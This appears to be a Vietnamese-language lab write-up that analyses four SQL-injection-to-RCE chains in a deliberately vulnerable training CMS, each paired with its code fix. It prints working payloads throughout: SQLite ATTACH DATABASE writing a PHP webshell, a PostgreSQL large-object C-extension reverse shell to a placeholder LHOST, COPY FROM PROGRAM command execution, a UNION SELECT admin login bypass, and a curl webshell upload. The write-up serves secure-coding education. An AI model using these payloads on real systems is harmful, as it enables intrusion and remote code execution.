# Phân tích 4 hướng SQL Injection to RCE trong BlueMarket CMS

BlueMarket CMS có 4 hướng SQLi to RCE được đặt trong các chức năng thật của website. Khi phân tích, không nên chỉ nhìn payload riêng lẻ, mà cần đi theo đúng luồng: người dùng nhập ở đâu, source code xử lý như thế nào, lỗi xuất hiện ở dòng nào, từ lỗi đó tạo payload ra sao, và cuối cùng code cần sửa như thế nào.

---

## Hướng 1: Product Search Analytics → SQLite `ATTACH DATABASE` → ghi webshell

### 1. Chức năng liên quan

Hướng này nằm ở chức năng tìm kiếm sản phẩm:

```text
/search?q=...
```

Trong `SearchController.php`, tham số `q` được lấy từ URL:

```php
$q = trim((string) ($_GET['q'] ?? ''));
```

Sau đó nếu `q` khác rỗng, hệ thống gọi:

```php
$cache->logSearch($q);
```

Tức là keyword người dùng nhập không chỉ dùng để search sản phẩm, mà còn được ghi vào SQLite cache để lưu lịch sử tìm kiếm. Source cho thấy `SearchController` lấy `$_GET['q']`, tạo `SqliteCacheService`, rồi truyền `$q` vào `logSearch()`.

### 2. Code có bug

Bug thật nằm trong file:

```text
app/src/Services/SqliteCacheService.php
```

Trong vulnerable mode, hàm `logSearch()` tạo SQL bằng cách nối chuỗi:

```php
$sql = "INSERT INTO search_logs(keyword, created_at) VALUES ('" . $keyword . "', datetime('now'))";
$this->pdo->exec($sql);
```

Đây là lỗi SQL Injection vì `$keyword` đến từ input người dùng nhưng được ghép trực tiếp vào câu SQL. Source cho thấy ở fixed mode code dùng `prepare()`, còn ở vulnerable mode code dùng `$this->pdo->exec($sql)` với `$keyword` nối thẳng vào query.

Câu SQL gốc có dạng:

```sql
INSERT INTO search_logs(keyword, created_at)
VALUES ('<keyword>', datetime('now'))
```

Vì `<keyword>` nằm trong dấu nháy đơn, attacker có thể nhập payload để đóng chuỗi này lại, kết thúc câu `INSERT`, rồi chèn thêm câu SQLite khác.

### 3. Phân tích từ code ra payload

Muốn thoát khỏi câu SQL gốc, payload cần bắt đầu bằng:

```sql
x', datetime('now'));
```

Giải thích:

```sql
x'
```

đóng phần keyword.

```sql
, datetime('now'));
```

hoàn thiện phần còn lại của `VALUES`.

Sau đó có thể chèn thêm câu:

```sql
ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
```

`ATTACH DATABASE` cho SQLite tạo hoặc mở thêm một file database khác. Nếu file đó được đặt trong thư mục `public/uploads` và có đuôi `.php`, attacker có thể cố ghi nội dung PHP vào file này.

Payload minh họa:

```sql
x', datetime('now'));
ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell;
CREATE TABLE shell.payload (code TEXT);
INSERT INTO shell.payload VALUES ('<?php system($_GET["cmd"] ?? "id"); ?>');
--
```

Sau khi payload chạy, truy cập:

```text
/uploads/cache.php?cmd=id
```

Nếu web server xử lý file đó như PHP thì có thể thực thi command.

### 4. Code fix

Trong chính source `SqliteCacheService.php`, fixed mode đã sửa đúng bằng prepared statement:

```php
$stmt = $this->pdo->prepare(
    'INSERT INTO search_logs(keyword, created_at) VALUES (:keyword, datetime("now"))'
);
$stmt->execute(['keyword' => $keyword]);
```

Source thật cho thấy đoạn này nằm trong nhánh:

```php
if ($this->mode === 'fixed') {
    ...
}
```

và kết thúc bằng `return`, nên vulnerable query phía dưới không còn được chạy.

### 5. Giải thích cách fix

Prepared statement giúp tách dữ liệu khỏi cú pháp SQL.

Khi viết:

```php
:keyword
```

SQLite hiểu đây là một tham số dữ liệu. Dù người dùng nhập:

```sql
'); ATTACH DATABASE ...
```

thì toàn bộ chuỗi đó vẫn chỉ là giá trị của cột `keyword`, không thể biến thành câu lệnh SQL mới.

Nói ngắn gọn:

```text
Trước fix:
input người dùng + SQL syntax = một câu SQL nguy hiểm

Sau fix:
SQL syntax cố định
input người dùng chỉ là dữ liệu
```

Ngoài ra, nên cấu hình thêm để SQLite cache không nằm trong webroot. Như vậy kể cả có lỗi ghi file, file cũng không thể được gọi trực tiếp qua trình duyệt.

---

## Hướng 2: Seller Activity Report → Second-order SQLi → PostgreSQL Large Object + C Extension

### 1. Chức năng liên quan

Hướng này nằm ở trang profile người bán:

```text
/profile?id=<seller_id>
```

Trong `ProfileController.php`, đầu tiên hệ thống lấy thông tin user theo `id`:

```php
$id = (string) ($_GET['id'] ?? (current_user()['id'] ?? '1'));
```

Ở vulnerable mode, query lấy user cũng bị nối chuỗi:

```php
$user = $userDb->queryOne(
    'SELECT id, username, email, role, description FROM users WHERE id = ' . $id
);
```

Sau đó hệ thống lấy email của user này và dùng email đó để truy vấn bài viết/activity. Source cho thấy controller dùng `$_GET['id']`, lấy user, rồi tạo tiếp `$activityDb` để lấy activity theo `$user['email']`.

### 2. Code có bug chính

Bug chính của hướng này nằm ở truy vấn Seller Activity:

```php
$sql = "SELECT title, body, created_at
        FROM posts
        WHERE author_email = '" . $user['email'] . "'
        ORDER BY created_at DESC";
$activity = $activityDb->queryAll($sql);
```

Lỗi nằm ở chỗ `$user['email']` được lấy từ database nhưng vẫn không được coi là dữ liệu nguy hiểm. Trong thực tế, email có thể đã bị attacker sửa trước qua chức năng update profile. Source cũng cho thấy `update()` lấy email từ `$_POST['email']`, sau đó cập nhật vào bảng `users` bằng query có tham số, tức là payload có thể được lưu vào database như dữ liệu.

Đây là second-order SQL Injection:

```text
Bước 1: attacker lưu payload vào users.email
Bước 2: backend lấy email từ database
Bước 3: backend nối email vào SQL khác
Bước 4: payload mới được kích hoạt
```

### 3. Phân tích từ code ra payload

Câu SQL gốc:

```sql
SELECT title, body, created_at
FROM posts
WHERE author_email = '<email>'
ORDER BY created_at DESC
```

Payload cần đóng chuỗi email:

```sql
x';
```

Sau đó chèn câu SQL PostgreSQL tùy ý.

Ví dụ payload kiểm tra SQLi:

```sql
x'; SELECT pg_sleep(2); SELECT title, body, created_at FROM posts WHERE '1'='1
```

Giải thích:

```sql
x';
```

đóng `author_email`.

```sql
SELECT pg_sleep(2);
```

kiểm tra xem stacked query có chạy không.

```sql
SELECT title, body, created_at FROM posts WHERE '1'='1
```

nối lại một câu `SELECT` có cùng số cột để phần xử lý phía sau không bị vỡ.

### 4. Payload dẫn tới RCE

Theo hướng này, SQLi không trực tiếp chạy command bằng `COPY FROM PROGRAM`, mà lợi dụng PostgreSQL Large Object và C extension.

Luồng:

```text
SQLi
→ tạo Large Object
→ ghi từng page của file .so vào pg_largeobject
→ lo_export() file .so ra /tmp
→ CREATE FUNCTION LANGUAGE C
→ SELECT rev_shell(...)
→ reverse shell
```

Payload ý tưởng:

```sql
x';
SELECT lo_create(55001);
SELECT title, body, created_at FROM posts WHERE '1'='1
```

Sau đó ghi từng page của file `.so` vào `pg_largeobject`:

```sql
x';
INSERT INTO pg_largeobject (loid, pageno, data)
VALUES (55001, 0, decode('<hex_page_0>', 'hex'));
SELECT title, body, created_at FROM posts WHERE '1'='1
```

Sau khi ghi đủ page:

```sql
x';
SELECT lo_export(55001, '/tmp/pg_rev_shell_manual.so');
CREATE FUNCTION rev_shell(text, integer)
RETURNS integer
AS '/tmp/pg_rev_shell_manual', 'rev_shell'
LANGUAGE C STRICT;
SELECT rev_shell('<LHOST>', <LPORT>);
SELECT title, body, created_at FROM posts WHERE '1'='1
```

Payload này chạy được trong lab vì vulnerable mode dùng database role `extension`. Trong `ProfileController.php`, source cho thấy:

```php
$activityDb = new PostgresService($this->isFixed() ? 'app' : 'extension');
```

Tức là fixed mode dùng role `app`, còn vulnerable mode dùng role `extension`.

### 5. Code fix

Trong source thật, fixed mode sửa bằng parameterized query:

```php
$activity = $activityDb->params(
    'SELECT title, body, created_at
     FROM posts
     WHERE author_email = $1
     ORDER BY created_at DESC',
    [$user['email']]
);
```

Đồng thời fixed mode dùng:

```php
$activityDb = new PostgresService($this->isFixed() ? 'app' : 'extension');
```

Nghĩa là khi fixed, app không dùng role `extension` nữa mà dùng role `app`.

Ngoài ra, phần lấy user theo `id` cũng cần dùng parameterized query. Source fixed mode đã làm như sau:

```php
$user = $userDb->paramsOne(
    'SELECT id, username, email, role, description FROM users WHERE id = $1',
    [$id]
);
```

### 6. Giải thích cách fix

Có 2 lớp fix.

Thứ nhất, sửa SQLi:

```php
WHERE author_email = $1
```

`$user['email']` được truyền vào dưới dạng tham số. Dù email trong database chứa payload như:

```sql
x'; SELECT lo_export(...); --
```

PostgreSQL vẫn coi nó là chuỗi email, không coi là SQL.

Thứ hai, sửa quyền database:

```text
Vulnerable mode: extension_user / role extension
Fixed mode: app_user / role app
```

Hướng Large Object + C Extension chỉ nguy hiểm khi role database có quyền cao. Nếu app dùng role ít quyền, attacker không thể tùy ý export file `.so`, tạo function C hoặc load native library.

---

## Hướng 3: Admin System Report → PostgreSQL `COPY FROM PROGRAM`

### 1. Chức năng liên quan

Hướng này nằm ở trang admin report:

```text
/admin/reports?type=health
```

Trong `ReportController.php`, controller bắt buộc user phải là admin:

```php
$this->requireAdmin();
```

Sau đó lấy tham số `type`:

```php
$type = (string) ($_GET['type'] ?? 'health');
```

Source cho thấy vulnerable mode dùng database role `report`, còn fixed mode dùng role `app`:

```php
$db = new PostgresService($this->isFixed() ? 'app' : 'report');
```

### 2. Code có bug

Trong vulnerable mode, code nối trực tiếp `$type` vào SQL:

```php
$sql = "SELECT type, label, description, query_name
        FROM report_templates
        WHERE type = '" . $type . "'
        ORDER BY id";
$templates = $db->queryAll($sql);
```

Đây là SQL Injection vì `type` đến từ URL. Attacker có thể đóng chuỗi `type`, chèn stacked query, rồi nối lại truy vấn. Source thật thể hiện rõ fixed mode dùng `$db->params(...)`, còn vulnerable mode dùng `$db->queryAll($sql)`.

### 3. Phân tích từ code ra payload

Câu SQL gốc:

```sql
SELECT type, label, description, query_name
FROM report_templates
WHERE type = '<type>'
ORDER BY id
```

Payload cần đóng chuỗi `type`:

```sql
health';
```

Sau đó chèn:

```sql
COPY report_worker_output(line) FROM PROGRAM 'id';
```

Vì trong vulnerable mode, trang report sẽ đọc bảng `report_worker_output`:

```php
return $db->queryAll(
    'SELECT line FROM report_worker_output ORDER BY id DESC LIMIT 50'
);
```

Source cho thấy hàm `readCommandOutput()` chỉ chạy ở vulnerable mode, kiểm tra bảng `report_worker_output`, rồi đọc 50 dòng mới nhất để hiển thị.

Payload hoàn chỉnh:

```sql
health';
COPY report_worker_output(line) FROM PROGRAM 'id';
SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

Giải thích:

```sql
health'
```

đóng chuỗi trong `WHERE type = '...'`.

```sql
COPY report_worker_output(line) FROM PROGRAM 'id';
```

yêu cầu PostgreSQL chạy lệnh `id` và ghi output vào bảng `report_worker_output`.

```sql
SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

nối lại câu SELECT để app vẫn nhận được dữ liệu đúng dạng.

Có thể thay `id` bằng lệnh demo an toàn khác:

```text
whoami
hostname
pwd
```

### 4. Code fix

Trong source thật, fixed mode sửa như sau:

```php
$templates = $db->params(
    'SELECT type, label, description, query_name
     FROM report_templates
     WHERE type = $1
     ORDER BY id',
    [$type]
);
```

Đồng thời role kết nối cũng đổi:

```php
$db = new PostgresService($this->isFixed() ? 'app' : 'report');
```

Tức là fixed mode không dùng role `report` nữa.

### 5. Giải thích cách fix

Fix ở đây cũng gồm 2 lớp.

Thứ nhất, parameterized query:

```php
WHERE type = $1
```

Khi đó input `type` không thể phá cấu trúc SQL. Payload kiểu:

```sql
health'; COPY ... FROM PROGRAM 'id'; --
```

sẽ chỉ là giá trị string của `type`.

Thứ hai, giảm quyền database role:

```text
Vulnerable mode dùng role report.
Fixed mode dùng role app.
```

Điểm nguy hiểm của hướng này không chỉ là SQLi, mà là SQLi cộng với quyền `COPY FROM PROGRAM`. Nếu role ứng dụng không có quyền chạy chương trình hệ điều hành, payload không thể leo thành RCE.

---

## Hướng 4: SQLi Login → Admin Takeover → Upload Media → RCE

### 1. Chức năng liên quan

Hướng này khác 3 hướng trên. Ba hướng đầu đi từ SQLi đến primitive của database. Hướng 4 đi theo đường ứng dụng:

```text
SQLi ở login
→ chiếm quyền admin
→ dùng chức năng admin
→ upload shell.php qua Media Upload
→ RCE
```

Các file source liên quan:

```text
app/src/Controllers/AuthController.php
app/src/Controllers/AdminController.php
app/src/Services/UploadService.php
```

### 2. Code bug ở login

Trong `AuthController.php`, login lấy dữ liệu từ form:

```php
$username = trim((string) ($_POST['username'] ?? ''));
$password = (string) ($_POST['password'] ?? '');
```

Ở fixed mode, code dùng parameterized query:

```php
$user = $db->paramsOne('SELECT * FROM users WHERE username = $1', [$username]);
```

Nhưng ở vulnerable mode, code nối trực tiếp username:

```php
$user = $db->queryOne("SELECT * FROM users WHERE username = '" . $username . "'");
```

Đây là SQL Injection vì `username` đến từ form login nhưng được ghép thẳng vào SQL. Source cho thấy rõ nhánh fixed dùng `$db->paramsOne(...)`, còn nhánh vulnerable dùng `$db->queryOne(...)` với chuỗi SQL nối từ `$username`.

### 3. Bug phụ làm admin takeover dễ hơn

Sau khi query trả về user, code kiểm tra password bằng hàm:

```php
private function passwordMatches(string $password, string $stored): bool
{
    return password_verify($password, $stored) || hash_equals($stored, $password);
}
```

Dòng nguy hiểm là:

```php
hash_equals($stored, $password)
```

Vì nó cho phép so sánh password dạng plaintext. Nếu attacker dùng SQLi để tự tạo một dòng user giả có `password_hash = 'ownedpass'`, rồi gửi password là `ownedpass`, hàm `passwordMatches()` sẽ trả về true.

### 4. Phân tích từ code ra payload admin takeover

Câu SQL gốc:

```sql
SELECT * FROM users WHERE username = '<username>'
```

Payload có thể dùng `UNION SELECT` để tự tạo một user giả:

```sql
' UNION SELECT 999,'owned','owned@local','ownedpass','admin','Injected admin',CURRENT_TIMESTAMP--
```

Khi gửi form:

```text
username = ' UNION SELECT 999,'owned','owned@local','ownedpass','admin','Injected admin',CURRENT_TIMESTAMP--
password = ownedpass
```

thì query trả về một row có:

```text
username = owned
password_hash = ownedpass
role = admin
```

Sau đó `passwordMatches()` so sánh:

```php
hash_equals('ownedpass', 'ownedpass')
```

nên login thành công. Vì role là `admin`, source sẽ redirect về `/admin`:

```php
\redirect(($user['role'] ?? '') === 'admin' ? '/admin' : '/profile?id=' . $user['id']);
```

### 5. Code bug ở upload media

Sau khi có quyền admin, attacker có thể vào chức năng upload media.

Trong `AdminController.php`, route upload gọi:

```php
$this->requireAdmin();
(new UploadService())->store($_FILES['media'] ?? [], $this->mode());
```

Tức là chỉ cần qua được `requireAdmin()` là có thể gọi upload.

Trong `UploadService.php`, file upload được xử lý như sau:

```php
$name = basename((string) $file['name']);
$target = $this->dir . '/' . $name;
```

Ở fixed mode, code kiểm tra extension, MIME thật, kích thước file rồi đổi tên
file sang random:

```php
if ($mode === 'fixed') {
    $allowed = [
        'jpg' => ['image/jpeg'],
        'jpeg' => ['image/jpeg'],
        'png' => ['image/png'],
        'gif' => ['image/gif'],
        'webp' => ['image/webp'],
    ];
    $extension = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    if (!array_key_exists($extension, $allowed)) {
        throw new \InvalidArgumentException('Fixed mode only accepts valid media files.');
    }

    $size = (int) ($file['size'] ?? 0);
    if ($size <= 0 || $size > 2_000_000) {
        throw new \InvalidArgumentException('Fixed mode only accepts media files up to 2 MB.');
    }

    $mime = (new \finfo(FILEINFO_MIME_TYPE))->file((string) $file['tmp_name']) ?: '';
    if (!in_array($mime, $allowed[$extension], true)) {
        throw new \InvalidArgumentException('Fixed mode only accepts valid media files.');
    }

    $target = $this->dir . '/' . bin2hex(random_bytes(16)) . '.' . $extension;
}
```

Nhưng ở vulnerable mode, đoạn kiểm tra này không chạy và `$target` vẫn giữ
filename người dùng gửi lên. Sau đó file được lưu thẳng:

```php
move_uploaded_file((string) $file['tmp_name'], $target)
```

Vì vậy attacker có thể upload file `.php` nếu server cho phép thực thi trong thư mục uploads. Source cho thấy chỉ fixed mode mới kiểm tra media thật và đổi tên file; vulnerable mode chỉ `basename()` rồi lưu file.

### 6. Payload upload webshell

Tạo file:

```php
<?php system($_GET["cmd"] ?? "id"); ?>
```

Upload với session admin đã chiếm được:

```bash
curl -b takeover.txt -F "media=@shell.php;type=image/png" http://localhost:5000/admin/media
```

Sau đó gọi:

```text
/uploads/shell.php?cmd=id
```

Ý nghĩa chain:

```text
SQLi login
→ tạo admin giả bằng UNION SELECT
→ đăng nhập thành công
→ upload shell.php
→ gọi shell.php?cmd=id
→ RCE
```

### 7. Code fix cho login

Sửa truy vấn login bằng parameterized query:

```php
$user = $db->paramsOne(
    'SELECT * FROM users WHERE username = $1',
    [$username]
);
```

Source hiện tại đã có đoạn này trong fixed mode.

Nên sửa thêm hàm kiểm tra password, bỏ so sánh plaintext:

```php
private function passwordMatches(string $password, string $stored): bool
{
    return password_verify($password, $stored);
}
```

Giải thích:

```text
password_verify()
→ kiểm tra password người dùng nhập với hash đã lưu

hash_equals($stored, $password)
→ nguy hiểm vì cho phép password_hash giả dạng plaintext
```

Nếu bỏ `hash_equals`, payload `UNION SELECT ... 'ownedpass' ...` sẽ không còn đăng nhập được vì `ownedpass` không phải password hash hợp lệ.

### 8. Code fix cho upload

Source fixed mode hiện tại đã check extension, MIME thật, kích thước file và
đổi filename random:

```php
$allowed = [
    'jpg' => ['image/jpeg'],
    'jpeg' => ['image/jpeg'],
    'png' => ['image/png'],
    'gif' => ['image/gif'],
    'webp' => ['image/webp'],
];
$extension = strtolower(pathinfo($name, PATHINFO_EXTENSION));

if (!array_key_exists($extension, $allowed)) {
    throw new \InvalidArgumentException('Fixed mode only accepts valid media files.');
}
```

Mức fix này chặn payload demo `shell.php`, chặn file giả extension sai MIME,
tránh attacker kiểm soát filename sau upload và giới hạn file tối đa 2 MB.
Trong thực tế vẫn nên harden thêm ở tầng web server:

```text
1. Lưu upload ngoài webroot nếu có thể.
2. Tắt PHP execution trong /uploads.
3. Tách domain/static host cho file user upload.
```

Như vậy kể cả attacker đổi tên `shell.php` thành `shell.png`, fixed mode vẫn
không nhận file nếu MIME không phải ảnh hợp lệ.

---

## Tổng kết 4 hướng

| Hướng   | File source có bug                                               | Lỗi chính                           | Payload chính                                 | Code fix                                                                    |
| ------- | ---------------------------------------------------------------- | ----------------------------------- | --------------------------------------------- | --------------------------------------------------------------------------- |
| Hướng 1 | `SqliteCacheService.php`                                         | Nối `$keyword` vào SQLite query     | `ATTACH DATABASE` ghi file PHP                | `prepare()` + `execute(['keyword' => $keyword])`                            |
| Hướng 2 | `ProfileController.php`                                          | Dùng lại `$user['email']` trong SQL | Large Object + `CREATE FUNCTION LANGUAGE C`   | `WHERE author_email = $1` + role `app`                                      |
| Hướng 3 | `ReportController.php`                                           | Nối `$type` vào report query        | `COPY report_worker_output FROM PROGRAM 'id'` | `WHERE type = $1` + role `app`                                              |
| Hướng 4 | `AuthController.php`, `UploadService.php`                        | SQLi login + upload media yếu       | `UNION SELECT` admin giả + upload shell       | parameterized login, bỏ plaintext password check, allow-list + MIME upload  |
